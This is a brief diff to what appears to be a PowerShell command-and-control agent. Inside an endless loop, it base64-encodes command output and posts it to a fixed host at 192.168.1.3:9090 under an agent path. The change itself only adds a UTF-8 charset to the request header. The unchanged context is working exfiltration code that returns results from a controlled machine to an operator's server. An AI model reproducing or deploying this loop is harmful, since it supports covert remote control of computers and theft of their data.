@@ -138,7 +138,7 @@ while ($true)
     #Echo $output
 	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
 	$redata = [System.Convert]::ToBase64String($bytes)
-    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8")
 	$re = $h3.UploadString("http://192.168.1.3:9090/re/$agent", "data="+$redata);
 	
 }
